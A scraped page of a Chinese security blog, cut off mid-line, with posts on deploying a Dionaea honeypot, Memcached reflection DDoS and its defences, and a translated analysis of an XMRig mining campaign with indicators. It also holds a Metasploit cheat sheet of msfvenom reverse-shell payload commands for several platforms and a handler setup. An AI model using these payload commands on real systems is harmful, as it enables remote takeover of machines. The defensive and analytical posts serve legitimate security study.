      <a data-url="http://wsygoogol.github.io/2018/06/29/数字取证入门/" data-id="cjl3ht17h001aww9l8dgydzuf" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Dionaea蜜罐部署" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/19/Dionaea蜜罐部署/" class="article-date">
  <time datetime="2018-03-19T03:02:28.000Z" itemprop="datePublished">2018-03-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/19/Dionaea蜜罐部署/">Dionaea蜜罐部署</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="http://dionaea.readthedocs.io/en/latest/installation.html" target="_blank" rel="external">http://dionaea.readthedocs.io/en/latest/installation.html</a></p>
<h4 id="0x00-系统的内核版本和发行版本"><a href="#0x00-系统的内核版本和发行版本" class="headerlink" title="0x00 系统的内核版本和发行版本"></a>0x00 系统的内核版本和发行版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ uname -a</div><div class="line">Linux wsy-virtual-machine 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></div><div class="line">$ lsb_release -a</div><div class="line">No LSB modules are available.</div><div class="line">Distributor ID:	Ubuntu</div><div class="line">Description:	Ubuntu 16.04.4 LTS</div><div class="line">Release:	16.04</div><div class="line">Codename:	xenial</div></pre></td></tr></table></figure>
<h4 id="0x01-安装依赖"><a href="#0x01-安装依赖" class="headerlink" title="0x01 安装依赖"></a>0x01 安装依赖</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install autoconf automake build-essential check cython3 libcurl4-openssl-dev libemu-dev libev-dev libglib2.0-dev libloudmouth1-dev libnetfilter-queue-dev libnl-3-dev libpcap-dev libssl-dev libtool libudns-dev python3 python3-dev python3-bson python3-yaml ttf-liberation</div></pre></td></tr></table></figure>
<h4 id="0x02-安装dionaea"><a href="#0x02-安装dionaea" class="headerlink" title="0x02 安装dionaea"></a>0x02 安装dionaea</h4><p>下载源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/DinoTools/dionaea.git</div><div class="line"><span class="built_in">cd</span>  dionaea</div></pre></td></tr></table></figure>
<p>成功安装所有依赖关系后,运行autreconf来构建或重建构建脚本,要进入./dionaea目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">autoreconf -vi</div></pre></td></tr></table></figure>
<p>configure:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --<span class="built_in">disable</span>-werror --prefix=/opt/dionaea --with-python=/usr/bin/python3 --with-cython-dir=/usr/bin --with-ev-include=/usr/include/ --with-ev-lib=/usr/lib --with-emu-lib=/usr/lib/libemu --with-emu-include=/usr/include --with-nl-include=/usr/include/libnl3 --with-nl-lib=/usr/lib</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
<p>蜜罐被装在了/opt/dionaea目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/opt/dionaea<span class="comment"># ls</span></div><div class="line">bin  etc  lib  var</div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/03/19/Dionaea蜜罐部署/" data-id="cjl3ht16q000tww9l48j519fy" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Blackhat-SEO" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/12/Blackhat-SEO/" class="article-date">
  <time datetime="2018-03-12T02:13:43.000Z" itemprop="datePublished">2018-03-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/12/Blackhat-SEO/">Blackhat SEO</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/03/12/Blackhat-SEO/" data-id="cjl3ht15w000qww9l8w3ezfsl" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-利用Memcached的反射型DDOS攻击" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/06/利用Memcached的反射型DDOS攻击/" class="article-date">
  <time datetime="2018-03-06T08:25:35.000Z" itemprop="datePublished">2018-03-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/06/利用Memcached的反射型DDOS攻击/">利用Memcached的反射型DDOS攻击</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="0x00-影响面"><a href="#0x00-影响面" class="headerlink" title="0x00 影响面"></a>0x00 影响面</h4><p>最近几天，Memcached反射DDOS流量突然增大，引起了国内外多家安全厂商和机构的注意，我也在第一时间持续关注跟踪相关事件。</p>
<p>根据shodan的统计，国内受<a href="">影响的</a>Memcached服务器大约有27300+个：</p>
<p><img src="/upload_image/Shodan_11211.png" alt=""></p>
<p>全球受影响的Memcached服务器大约有119000+个：</p>
<p><img src="/upload_image/shodan_11211_all.png" alt=""></p>
<p>DDoSMon统计的Memcache DRDOS在现网中的情况：</p>
<p><img src="/upload_image/ddosmon_memcache.png" alt=""></p>
<h4 id="0x01-Memcached-反射DDOS攻击原理"><a href="#0x01-Memcached-反射DDOS攻击原理" class="headerlink" title="0x01 Memcached 反射DDOS攻击原理"></a>0x01 Memcached 反射DDOS攻击原理</h4><h6 id="什么是反射DDOS（DRDOS）"><a href="#什么是反射DDOS（DRDOS）" class="headerlink" title="什么是反射DDOS（DRDOS）"></a>什么是反射DDOS（DRDOS）</h6><p>反射DDOS是发送大量带有被害者IP地址的请求给反射服务器，反射服务器对IP地址源做出大量回应，形成拒绝服务攻击。CLOUDFLARE的这张图很好的解释了DDOS反射攻击过程：</p>
<p><img src="/upload_image/cloudflare.png" alt=""></p>
<h6 id="UDP反射放大攻击需要满足的基本条件："><a href="#UDP反射放大攻击需要满足的基本条件：" class="headerlink" title="UDP反射放大攻击需要满足的基本条件："></a>UDP反射放大攻击需要满足的基本条件：</h6><p>1.攻击者，需要能伪造IP，并发送大量伪造IP的请求给反射服务器。</p>
<p>2.反射服务器，上面需要运行着容易放大反射攻击的服务。</p>
<p>3.反射服务器的响应包最好远远大于请求包。</p>
<p>4.反射服务器对应的协议或服务在互联网上有一定的使用量。</p>
<p>本次事件中，攻击者发送大量带有被害者IP地址的UDP数据包给Memcached服务器，Memcached服务器对伪造的IP地址源做出大量回应，形成分布式拒绝服务攻击。</p>
<h6 id="本次攻击的特点："><a href="#本次攻击的特点：" class="headerlink" title="本次攻击的特点："></a>本次攻击的特点：</h6><p>1.memcache放大倍数高，最高可以达到51000倍左右。</p>
<p>2.可被利用的memcache服务器（反射服务器）数量很多，而且这些服务器网络拥有较高的带宽资源。</p>
<p>下面这张us-cert的表详细的给出了各类反射攻击的放大倍数：</p>
<p><img src="/upload_image/cert-ddos.png" alt=""></p>
<p>仅从放大倍数看，memcached 反射DDOS危害要高于其他类型的反射DDOS。</p>
<h6 id="Memcached-DRDOS攻击流程"><a href="#Memcached-DRDOS攻击流程" class="headerlink" title="Memcached DRDOS攻击流程"></a>Memcached DRDOS攻击流程</h6><p>1.收集反射器,扫描端口和服务，获取不需要认证的Memcache。</p>
<p>2.上传指定数据到远程服务器Memcached上。</p>
<p>3.攻击者将自身IP伪造成攻击的目标IP地址，向Memcached反射服务器发送请求读取在Memcached中存储的数据。</p>
<p>4.Memcached在收到请求后，向伪造的IP回复放大了几万倍的数据包，造成反射DDOS攻击。</p>
<h4 id="0x02-Memcached环境搭建"><a href="#0x02-Memcached环境搭建" class="headerlink" title="0x02 Memcached环境搭建"></a>0x02 Memcached环境搭建</h4><p>系统centos7</p>
<p>安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install memcached</div></pre></td></tr></table></figure>
<p>将memcached加入linux服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chkconfig --level 2345 memcached on</div></pre></td></tr></table></figure>
<p>vi /etc/sysconfig/memcached来修改参数， 修改memcached的参数，主要涉及memcached启动绑定的端口、用户、最大连接、最大内存等.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PORT=<span class="string">"11211"</span></div><div class="line">USER=<span class="string">"memcached"</span></div><div class="line">MAXCONN=<span class="string">"1024"</span></div><div class="line">CACHESIZE=<span class="string">"64"</span></div><div class="line">OPTIONS=<span class="string">""</span></div></pre></td></tr></table></figure>
<p>启动、关闭、重启memcached服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start/stop/restart memcached.service</div></pre></td></tr></table></figure>
<p>修改完配置参数后，需要重启memcached服务来完成参数的生效。</p>
<p>可使用memcached-tool来检测memcached的服务状态：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memcached-tool 127.0.0.1:11211 stats</div></pre></td></tr></table></figure>
<p>正常情况下显示如下：</p>
<p><img src="/upload_image/memcached_status.png" alt=""></p>
<h4 id="0x03-DRDOS攻击测试"><a href="#0x03-DRDOS攻击测试" class="headerlink" title="0x03 DRDOS攻击测试"></a>0x03 DRDOS攻击测试</h4><p>蜜罐搭建成功后我们对它进行了一些测试，让我们看看反射放大效果：</p>
<p><img src="/upload_image/memcached_test.png" alt=""></p>
<p>可以看到，本次测试放大倍数基本上稳定在2w+多倍，太恐怖了。</p>
<p>形成的攻击报文如下：</p>
<p><img src="/upload_image/memcached_pcap.png" alt=""></p>
<h4 id="0x04Memcached反射DDOS防御"><a href="#0x04Memcached反射DDOS防御" class="headerlink" title="0x04Memcached反射DDOS防御"></a>0x04Memcached反射DDOS防御</h4><h6 id="Memcached攻击流量清洗"><a href="#Memcached攻击流量清洗" class="headerlink" title="Memcached攻击流量清洗"></a>Memcached攻击流量清洗</h6><ol>
<li><p>运营商处在边界配置UDP访问控制规则和BGP FlowSpec策略，将源端口为11211的流量进行阻断或限速。</p>
</li>
<li><p>不具备路由权限的企业客客户，可以在抗DDOS设备上配置防护策略，同样可以对端口为11211的UDP流量进行阻断和限速。</p>
</li>
</ol>
<h6 id="Memcached系统防护加固"><a href="#Memcached系统防护加固" class="headerlink" title="Memcached系统防护加固"></a>Memcached系统防护加固</h6><p>默认情况下Memcached没有配置任何认证鉴权措施，对所有网络可达的客户端可访问。为了避免Memcached系统被攻击者利用，各开发者和memcache管理者，需要对Memcached服务进行安全检查，进行一些加固。</p>
<h6 id="1-配置监听地址仅限本地回环地址"><a href="#1-配置监听地址仅限本地回环地址" class="headerlink" title="1.配置监听地址仅限本地回环地址"></a>1.配置监听地址仅限本地回环地址</h6><p>在 memcached的配置文件，或者启动参数中，使用”-l 127.0.0.1”指定监听的 ip 地址。</p>
<p><img src="/upload_image/memcache_jiagu.png" alt=""></p>
<h6 id="2-配置防火墙-ACL-策略"><a href="#2-配置防火墙-ACL-策略" class="headerlink" title="2.配置防火墙 ACL 策略"></a>2.配置防火墙 ACL 策略</h6><p>使用 iptables 等手段控制 memcached 的端口ACL策略，示例如下：</p>
<p>仅限来自指定 IP 段的访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -t filter -A INPUT -p tcp -s 192.168.1.0/24 --dport 11211 -j ACCEPT</div></pre></td></tr></table></figure>
<p>屏蔽任何其他 IP 对 Memcached 端口的访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -t filter -A INPUT -p tcp --dport 11211 -j DROP</div></pre></td></tr></table></figure>
<h6 id="3-配置认证鉴权策略"><a href="#3-配置认证鉴权策略" class="headerlink" title="3. 配置认证鉴权策略"></a>3. 配置认证鉴权策略</h6><p>Memcached 1.4.3 及之后的版本，如果编译时开启了 –enable-sasl，则可以使用 sasl 配置认证。</p>
<p>安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install cyrus-sasl</div></pre></td></tr></table></figure>
<p>设置用于 Memcached 的 SASL 用户名密码,运行以下命令，指定需要的用户名，然后输入两次密码即可:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">saslpasswd2 -a memcached -c [customized username]</div></pre></td></tr></table></figure>
<p>由于 SASL 账户密码默认保存在 /etc/sasldb2 文件里，但是该文件权限为 0640 或者 0660，对于运行 Memcached 的 user/group 不可读，因此需要做一些权限上面的修改。</p>
<p>配置该文件的属组为 Memcached 运行所用的 group。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chown :memcached /etc/sasldb2</div></pre></td></tr></table></figure>
<p>配置 Memcached 启用 SASL 认证在 memcached 的配置文件，或者启动参数中，使用 “ -S ” 即可开启 SASL 认证示例配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PORT=&quot;11211&quot;</div><div class="line"></div><div class="line">USER=&quot;memcached&quot;</div><div class="line"></div><div class="line">MAXCONN=&quot;1024&quot;</div><div class="line"></div><div class="line">CACHESIZE=&quot;64&quot;</div><div class="line"></div><div class="line">OPTIONS=&quot;-S&quot;</div></pre></td></tr></table></figure>
<h4 id="0x05-追溯处置措施"><a href="#0x05-追溯处置措施" class="headerlink" title="0x05 追溯处置措施"></a>0x05 追溯处置措施</h4><p>这种反射DDOS攻击源追踪难点在于准确定位，在被攻击端，看到的IP都是真实的IP，都是被利用的反射放大节点服务器。和直接攻击不一样，因为有反射的因素，这时候看到的真实攻击IP不是真正的发起原始流量的IP。下面结合以往追溯DDOS攻击的经验给出几点建议<strong>：</strong></p>
<h6 id="反射源上找线索"><a href="#反射源上找线索" class="headerlink" title="反射源上找线索"></a>反射源上找线索</h6><p>通过memcached蜜罐监测，看初期的信息采集阶段（比如找可用度反射放大源）很可能用的就是自己的IP，各种小动作会露出马脚，再多个维度关联，有时也能找出攻击者。</p>
<h6 id="失陷主机上找线索"><a href="#失陷主机上找线索" class="headerlink" title="失陷主机上找线索"></a>失陷主机上找线索</h6><p>在一次大流量过后，访问量高的IP都可以列为可疑目标，重点排查，尤其要注意筛选ICMP数据包，一般情况下攻击者有个习惯：就是在攻击的过程中和攻击结束都会用本机ping目标服务器，查看目标的存活性。如果运气好，能找出攻击者。</p>
<h6 id="运营商配合定位攻击者"><a href="#运营商配合定位攻击者" class="headerlink" title="运营商配合定位攻击者"></a>运营商配合定位攻击者</h6><p>通过memcached蜜罐的监测，根据以上测试过程中得出的Memcached DRDOS攻击的流量特征，和运营商配合，看哪些子网有非自己段的源IP流量出来，然后再做端的流量监测，比如HIDS，即为可以找出可疑IP。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/03/06/利用Memcached的反射型DDOS攻击/" data-id="cjl3ht17e0018ww9lnf25oits" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-metasploit备忘" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/28/metasploit备忘/" class="article-date">
  <time datetime="2018-01-28T11:24:54.000Z" itemprop="datePublished">2018-01-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/28/metasploit备忘/">metasploit备忘</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Creating Metasploit Payloads</p>
<p>List payloads<br>msfvenom -l</p>
<p>Binaries</p>
<p>Linux<br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f elf &gt; shell.elf</your></your></p>
<p>Windows<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f exe &gt; shell.exe</your></your></p>
<p>Mac<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f macho &gt; shell.macho</your></your></p>
<p>Web Payloads</p>
<p>PHP<br>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</your></your></p>
<p>ASP<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f asp &gt; shell.asp</your></your></p>
<p>JSP<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.jsp</your></your></p>
<p>WAR<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f war &gt; shell.war</your></your></p>
<p>Scripting Payloads</p>
<p>Python<br>msfvenom -p cmd/unix/reverse_python LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.py</your></your></p>
<p>Bash<br>msfvenom -p cmd/unix/reverse_bash LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.sh</your></your></p>
<p>Perl<br>msfvenom -p cmd/unix/reverse_perl LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.pl</your></your></p>
<p>Shellcode</p>
<p>For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.</p>
<p>Linux Based Shellcode<br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f <language></language></your></your></p>
<p>Windows Based Shellcode<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f <language></language></your></your></p>
<p>Mac Based Shellcode<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f <language></language></your></your></p>
<p>Handlers</p>
<p>Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.</p>
<p>use exploit/multi/handler<br>set PAYLOAD <payload name=""><br>set LHOST <lhost value=""><br>set LPORT <lport value=""><br>set ExitOnSession false<br>exploit -j -z</lport></lhost></payload></p>
<p>Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/28/metasploit备忘/" data-id="cjl3ht16w0010ww9lqs124l85" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-利用XMRig的大规模Monero挖矿行为" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/25/利用XMRig的大规模Monero挖矿行为/" class="article-date">
  <time datetime="2018-01-25T02:02:10.000Z" itemprop="datePublished">2018-01-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/25/利用XMRig的大规模Monero挖矿行为/">利用XMRig的大规模Monero挖矿行为</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>昨天，Palo Alto发了一篇关于通过开源程序XMRig进行挖矿的行为报告，最近我们也在处理相关的事件，本文会结合我们处理的一些问题对Palo Alto的报告进行一个简单的翻译，文末有一大波IOC信息。</p>
<p>January 24, 2018，Palo Alto发了一篇关于通过开源程序XMRig进行挖矿的行为报告，最近我们也在处理相关的事件，本文会结合我们处理的一些问题对Palo Alto的报告进行一个简单的翻译。</p>
<h4 id="0x00-概要"><a href="#0x00-概要" class="headerlink" title="0x00 概要"></a>0x00 概要</h4><p>根据Palo Alto的数据，此次事件的受害者有1500万人，主要分布在东南亚，北非和南美洲。实际受害者可能更多，大概再3000万左右。</p>
<p>攻击者大量使用VBS文件，并使用各种在线URL缩短服务来安装和运行XMRig payload。另外，攻击者在他们所连接的主机上利用XMRig代理服务来掩盖使用的钱包。</p>
<h4 id="0x01-传播"><a href="#0x01-传播" class="headerlink" title="0x01 传播"></a>0x01 传播</h4><p>目前为止，在这个Monero加密货币挖掘活动中观察到超过250个独特的Microsoft Windows PE文件。</p>
<p>其中一半以上的样本是从<a href="https://en.4sync.com/" target="_blank" rel="external">4sync</a>在线云存储提供商处下载的。不幸的是，还不知道是什么启动了恶意软件样本的这些下载。</p>
<p>但是，当我们查看原始文件名时，可以得到一些线索。下面是观察到的原始文件名前缀的百分比：</p>
<p><img src="/upload_image/original_filename.png" alt=""></p>
<p>正如我们所看到的，攻击者希望使这些文件看起来既具有通用名称，也似乎来源于流行的文件共享服务。文件名还以其他方式提供线索，就像“[File4org]”这个前缀对于此特定恶意软件活动是唯一的。</p>
<p><a href="https://adf.ly/" target="_blank" rel="external">Adf.ly</a>是一个网址缩短服务。根据下面报告，很多Adfly URLs是恶意链接，用户点击短链接，下载cryptocurrency恶意软件到他们的电脑上。</p>
<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure1-3.png" alt="figure1"></p>
<p><em>Figure 1 Reddit user complaining that they downloaded the cryptocurrency malware due to a malicious Adfly advertisement</em></p>
<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure2-2.png" alt="img"></p>
<p><em>Figure 2 YouTube user explaining how they downloaded and ran the cryptocurrency malware</em></p>
<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure3-2.png" alt="img"></p>
<p><em>Figure 3 User explaining that they downloaded the cryptocurrency malware when attempting to download a counter-strike: Go cheat using an Adfly URL. Translated from gutefrage.com, a German question/answer website.</em></p>
<p>值得注意的是，图2中，受害者点击Adfly广告链接，认为是视频中提到的文件的下载。然而，下载了有问题的文件，重定向到Monero挖掘恶意软件。</p>
<h4 id="0x02-恶意软件分析"><a href="#0x02-恶意软件分析" class="headerlink" title="0x02 恶意软件分析"></a>0x02 恶意软件分析</h4><p>这个Monero挖矿恶意软件有很多特征：</p>
<ul>
<li>通过VBS文件执行XMRig挖矿软件</li>
<li>使用XMRig代理服务来隐藏矿池目标</li>
<li>使用Nicehash</li>
</ul>
<p><a href="https://www.nicehash.com/" target="_blank" rel="external">NiceHash</a>是现今世界上最大的加密货币算力市场, 随时可为算力买家提供超过20种不同的算法的算力.</p>
<p>在过去的4-5个月里，Unit 42(Palo Alto Networks)观察到了这些攻击者如何部署他们的恶意软件的变化。</p>
<p>截至2017年10月20日，此活动背后的攻击者严重依赖Windows内置的<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa362813(v=vs.85" target="_blank" rel="external">BITSAdmin</a>.aspx)工具。这个工具允许攻击者远程下载脚本和XMRig挖矿工具。恶意样本的典型工作流程如下：</p>
<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/figure4-2.png" alt="img"></p>
<p><em>Figure 4 Execution workflow for the oldest malware encountered in this campaign</em></p>
<p>删除VBS和LNK文件的初始样本是一个自解压缩可执行文件（SFX）。这些可执行文件在俄文语言的提取脚本中包含标准注释。用于下载附加示例的VBS文件很简洁，如下所示：<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_5.png" alt="Monero_5"></p>
<p><em>Figure 5 Example VBS file observed in the oldest malware encountered in campaign</em></p>
<p>最终的payload主要是安装”msvc.exe”。有一些是包括”winmsvc.exe”或者”onedrive.exe”.这些payload被丢弃在受害者的％APPDATA％文件夹中的一个子目录中。最常见的子文件夹名是”msvc“。</p>
<p>第一批样本在2017年10月20日之前被发现，他们通过80, 443, 8443, 8080, 1725, 或者123端口连接到相同的XMRig代理服务：</p>
<ul>
<li>a.pool[.]ml</li>
</ul>
<p>2017年10月20日之后，攻击者开始尝试修改恶意软件的运行方式。他们不再使用BITSAdmin服务下载，并开始尝试使用HTTP重定向服务。在此期间，他们继续使用SFX文件下载和部署恶意软件。</p>
<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_6.png" alt="Monero_6"></p>
<p><em>Figure 6 Execution workflow for the second phase of malware encountered in this campaign</em></p>
<p>从这批恶意软件样本开始，攻击者开始用一个用户名补充他们的挖掘查询，可能会区分特定的分布式攻击波。下面是一个矿工如何运行的例子：</p>
<p>“C:\Users\Administrator\AppData\Roaming\mnxz\msvc.exe” -o 144.76.201[.]175:8080 -u x3 –nicehash –max-cpu-usage=20 –keepalive</p>
<p>这些用户名在整个挖矿活动的其余部分都会继续存在，截至撰写本文时仍在使用。观察用户名的完整列表如下：</p>
<ul>
<li>x3x2</li>
<li>x3</li>
<li>x2</li>
<li>x7x2</li>
<li>x7x3</li>
<li>x</li>
<li>x6</li>
<li>x7</li>
<li>x4</li>
<li>x5</li>
</ul>
<p>在这段时间内，攻击者为了逃避检测也开始在VBS文件中进行混淆尝试，如下所示：</p>
<p><img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_7.png" alt="Monero_7"></p>
<p><em>Figure 7 Obfuscated VBS file used by attackers</em></p>
<p>攻击者选择的重定向服务通常包含以下内容之一：</p>
<ul>
<li>clicklinkredirect[.]com</li>
<li>clck[.]gg</li>
<li>99lnk[.]com</li>
<li>1395867912[.]pw</li>
<li>browge[.]com</li>
<li>lnkredirect[.]com</li>
</ul>
<p>应该注意的是，上面列出的所有域名都托管在德国的一个IP地址144.76.155 [.] 139上。虽然bitly多数情况下的用途是合法的，但是144.76.155[.]139这个IP托管的重定向服务专门用于和加密货币挖掘活动相关的恶意目的。与所遇到的原始恶意软件样本一样，攻击者通常使用名为’msvc.exe’程序来投放payload。有时候也以“ErrorCheck.exe”和“CleanError.exe”命名。样本的子文件夹主要是“msvc”,”mnxz”,”mnaxz”.</p>
<p>在此期间，下列XMRig代理已被恶意软件用于连接：</p>
<ul>
<li>5.101.122[.]228</li>
<li>144.76.201[.]175</li>
<li>b.pool[.]gq</li>
<li>f.pooling[.]cf</li>
</ul>
<p>从2017年11月16日开始，攻击者再次改变了他们的恶意软件的策略。他们不再使用SFX文件，而是转换为使用在Microsoft .NET Framework中编译的可执行文件，该文件将VBS文件写入磁盘并修改受害者的运行注册表项以确保持久性。<img src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/Monero_8.png" alt="img"></p>
<p><em>Figure 8 .NET dropper file used by the attackers writing the VBS file to disk</em></p>
<p>这个恶意软件通常以“msvc.exe“或者”mingc.exe“传播。此外，在这些样本中都有唯一的PDB字符串，这些样本始终对编译它的用户使用相同的用户名。</p>
<p>在所有观察样本中发现了以下PDB字符串：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">C:\Users\роаипроаип\Desktop\MingC_Installer\MingC4\WindowsFormsApplication1\obj\x86\Debug\WindowsApplication.pdb</div><div class="line">C:\Users\роаипроаип\documents\visual studio 2015\Projects\WindowsFormsApplication1\WindowsFormsApplication1\obj\Debug\Inst.pdb</div><div class="line">C:\Users\роаипроаип\documents\visual studio 2015\Projects\WindowsFormsApplication2\WindowsFormsApplication2\obj\Debug\WindowsFormsApplication2.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MingC_Installer\MingC4\WindowsFormsApplication1\obj\Release\[File4org]_421058.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MingC3\WindowsFormsApplication1\obj\Debug\[File4org]_421058.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\WindowsFormsApplication1\WindowsFormsApplication1\obj\Debug\Oal.pdb</div><div class="line">C:\Users\Роман\Desktop\MingC2\WindowsFormsApplication1\obj\Release\[File4org]_421058.pdb</div><div class="line">C:\Users\роаипроаип\Desktop\MineCor\WindowsFormsApplication1\obj\Debug\[Dropmefiles]_421057.pdb</div><div class="line">C:\Users\роаипроаип\documents\visual 